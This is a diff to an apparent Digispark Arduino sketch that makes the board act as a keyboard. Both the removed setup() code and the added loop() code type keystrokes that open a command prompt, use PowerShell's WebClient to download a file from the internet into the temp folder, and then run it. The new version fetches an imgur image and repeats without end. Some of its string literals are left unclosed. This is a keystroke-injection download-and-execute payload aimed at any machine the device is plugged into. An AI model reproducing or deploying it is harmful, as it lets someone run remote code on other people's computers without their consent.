@@ -3,21 +3,28 @@
 #define MOD_ALT_LEFT  A0
 void setup() {
   // put your setup code here, to run once:
-DigiKeyboard.delay(1000);
-DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); 
-DigiKeyboard.delay(1000);
-DigiKeyboard.print(F("C:\Windows\System32\cmd.exe"));
-DigiKeyboard.delay(1000);
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(1000);
-DigiKeyboard.print(F("powershell (new-object System.Net.WebClient).DownloadFile('link on file, that you want to be downloaded','%Temp%/yourfile'));
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.delay(2000);
-DigiKeyboard.print(F("%Temp%/yourfile"));
-DigiKeyboard.sendKeyStroke(KEY_ENTER);  
-DigiKeyboard.delay(2000);
-DigiKeyboard.print(F("exit"));
-DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
 }
 
+void loop() {
+  // put your main code here, to run repeatedly:
+delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+delay(1000);
+DigiKeyboard.print("cmd");
+delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(500);
+DigiKeyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://i.imgur.com/TPJP0kT.png','%Temp%/TPJP0kT.png');
+delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(500);
+DigiKeyboard.print("%Temp%/TPJP0kT.png");
+delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+delay(500);
+DigiKeyboard.print("exit");
+delay(500);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
 
